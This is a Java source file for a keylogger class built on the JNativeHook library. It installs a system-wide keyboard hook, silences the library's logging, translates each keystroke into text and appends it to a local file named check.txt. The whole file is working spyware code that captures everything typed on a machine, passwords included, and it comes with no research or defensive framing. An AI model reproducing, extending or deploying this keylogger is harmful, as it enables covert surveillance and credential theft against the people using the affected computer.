
import java.io.FileWriter;
import java.io.IOException;
import java.util.logging.Level;
import java.util.logging.Logger;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */

/**
 *
 * @author phuon
 */
public class KeyLog implements NativeKeyListener{
    boolean pause = false;
    public void KeyLogger() {
        if(!pause)
        {
            try {
                GlobalScreen.registerNativeHook();
            } catch (NativeHookException ex) {
                Logger.getLogger(KeyLog.class.getName()).log(Level.SEVERE, null, ex);
            }
            GlobalScreen.addNativeKeyListener(new KeyLog());
            Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
            logger.setLevel(Level.OFF);
        }
    }
    @Override
    public void nativeKeyTyped(NativeKeyEvent nke) {
        
    }
    @Override
    public void nativeKeyPressed(NativeKeyEvent nke) {
        try {
            String tmp = "", tmp1 = "";
            tmp += NativeKeyEvent.getKeyText(nke.getKeyCode());
            switch (tmp) {
                case "Escape": tmp1 += "_Esc";
                    break;
                case "Back Quote": tmp1 += "_`";
                    break;
                case "Minus": tmp1 += "-";
                    break;
                case "Equals": tmp1 += "=";
                    break;
                case "Tab": tmp1 += "_Tab";
                    break;
                case "Open Bracket": tmp1 += "[";
                    break;
                case "Close Bracket": tmp1 += "]";
                    break;
                case "Back Slash": tmp1 += "\\";
                    break;
                case "Caps Lock": tmp1 += "_CapsLock";
                    break;
                case "Semicolon": tmp1 += ";";
                    break;
                case "Quote": tmp1 += "'";
                    break;
                case "Enter": tmp1 += "_Enter\n";
                    break;
                case "Shift": tmp1 += "_Shift";
                    break;
                case "Comma": tmp1 += ",";
                    break;
                case "Period": tmp1 += ".";
                    break;
                case "Slash": tmp1 += "/";
                    break;
                case "Unknown keyCode: 0xe36": tmp1 += "_Shift";
                    break;
                case "Ctrl": tmp1 += "_Ctrl";
                    break;
                case "Meta": tmp1 += "_Windows";
                    break;
                case "Alt": tmp1 += "_Alt";
                    break;
                case "Space": tmp1 += " ";
                    break;
                case "Context Menu": tmp1 += "_TextMenu";
                    break;
                case "Print Screen": tmp1 += "*(PrintScreen)";
                    break;
                case "Insert": tmp1 += "_Insert";
                    break;
                case "Home": tmp1 += "_Home";
                    break;
                case "Page Up": tmp1 += "_PageUp";
                    break;
                case "Delete": tmp1 += "_Delete";
                    break;
                case "Page Down": tmp1 += "_PageDown";
                    break;
                case "Left": tmp1 += "._Left";
                    break;
                case "Up": tmp1 += "_Up";
                    break;
                case "Down": tmp1 += "_Down";
                    break;
                case "Right": tmp1 += "_Right";
                    break;
                case "Num Lock": tmp1 += "_NumLock";
                    break;
                case "Unknown keyCode: 0xe4a": tmp1 += "-";
                    break;
                case "Unknown keyCode: 0xe4e": tmp1 += "+";
                    break;
                case "Numpad ,": tmp1 += ".";
                    break;
                case "Backspace": tmp1 += "_Backspace";
                    break;
                default: tmp1 = tmp;
                    break;
            }
            try (FileWriter myWriter = new FileWriter("check.txt", true)) {
                myWriter.write(tmp1);
            }
        } catch (IOException ex) {
           Logger.getLogger(KeyLog.class.getName()).log(Level.SEVERE, null, ex);
        }
    }
    @Override
    public void nativeKeyReleased(NativeKeyEvent nke) {
        
    }
    
}
